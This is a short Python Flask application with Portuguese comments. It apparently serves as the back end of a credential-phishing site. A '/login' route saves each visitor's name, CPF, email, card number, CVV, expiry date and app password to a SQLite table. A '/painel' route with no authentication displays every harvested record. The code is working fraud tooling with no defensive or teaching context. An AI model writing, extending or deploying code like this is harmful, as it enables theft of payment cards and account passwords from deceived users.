import os
import sqlite3
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)
DB_NAME = 'database_final_v10.db'

def get_db_connection():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    conn.execute('''CREATE TABLE IF NOT EXISTS clientes 
        (id INTEGER PRIMARY KEY AUTOINCREMENT, 
         nome TEXT, cpf TEXT, email TEXT, 
         num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    init_db()  # Garante a criação ao acessar a home
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        data = (
            request.form.get('nome'), request.form.get('cpf'), request.form.get('email'),
            request.form.get('num_cartao'), request.form.get('senha_app'),
            request.form.get('cvv'), request.form.get('validade')
        )
        conn = get_db_connection()
        conn.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
                        VALUES (?,?,?,?,?,?,?)''', data)
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro ao salvar: {e}")
    return redirect(url_for('sucesso'))

@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')

@app.route('/painel')
def admin():
    init_db() # Se a tabela sumiu por erro do Render, ele recria aqui antes de dar erro
    try:
        conn = get_db_connection()
        usuarios = conn.execute('SELECT * FROM clientes ORDER BY id DESC').fetchall()
        conn.close()
        return render_template('admin.html', usuarios=usuarios)
    except Exception as e:
        return f"Erro crítico: {e}"

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)






